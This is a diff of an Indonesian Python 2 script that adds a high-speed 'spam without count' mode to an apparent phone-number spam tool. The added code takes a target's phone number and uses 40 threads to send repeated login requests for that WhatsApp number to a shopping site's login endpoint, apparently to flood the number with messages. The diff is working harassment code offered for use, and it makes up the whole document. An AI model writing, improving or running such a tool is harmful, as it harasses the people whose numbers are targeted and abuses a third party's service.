@@ -1,7 +1,7 @@
 #-*-coding:utf-8-*-
 try:
- import requests, sys, time, random, json, os
-except:os.system('pip2 install requests')
+ import requests, sys, time, random, json, os, inquirer
+except:os.system('pip2 install requests inquirer')
 from multiprocessing.pool import ThreadPool
 try:
  config = open(".config.json","r").read()
@@ -96,10 +96,36 @@ def modesatu():
      gal = gal-1
  print "\n%s[%s!%s] %sSelesai.."%(pu,me,pu,hi)
 
+def modeduaext(hh):
+   lala = requests.post('https://tasya.tunjunganplaza.com/login/in',data={'whatsapp':'0'+nomor,'password':pw,'rememberme':'0'}).text
+   if json.loads(lala)["pesan"] == "Success":
+    print "%s[%s!%s] %sSuccess"%(pu,me,pu,hi)
+   else:
+    print "%s[%s!%s] %sGagal"%(pu,me,pu,me)
+def modedua():
+ while True:
+  global nomor
+  nomor = raw_input("%s[%s?%s] %sMasukkan nomor telepon (ex:881188xxx) : %s"%(pu,me,pu,qu,hi))
+  if len(nomor) < 5: print "%s[%s!%s] %sMasukkan nomor telepon dengan benar!!"%(pu,me,pu,me)
+  elif nomor.startswith(tuple(['0','+62','62'])): print "%s[%s!%s] %sMasukkan nomor tanpa awalan 0,+62,ataupun 62"%(pu,me,pu,me)
+  else:break
+ global pw
+ pw = str(random.randint(0,10000000))
+ hhh = json.loads(open(".config.json","rb").read())
+ try:
+  hhh[nomor]
+ except: hhh[nomor] = pw;open(".config.json","wb").write(json.dumps(hhh))
+ else:pw=hhh[nomor]
+ check(nomor,pw)
+ ThreadPool(40).map(modeduaext,open('.tumbal').read().splitlines())
 
 if __name__ == "__main__":
  try:
   banner()
-  modesatu()
+  tyn = inquirer.prompt([inquirer.List('tanya',message=qu+'Pilih mode',choices=["Spam dengan jumlah","Spam tanpa jumlah (kecepatan super 50/2s)"],),])["tanya"]
+  if tyn == "Spam dengan jumlah":
+   modesatu()
+  else:
+   modedua()
  except requests.ConnectionError:print "%s[%s!%s] %sPeriksa koneksi internetmu!!"%(pu,me,pu,me)
 
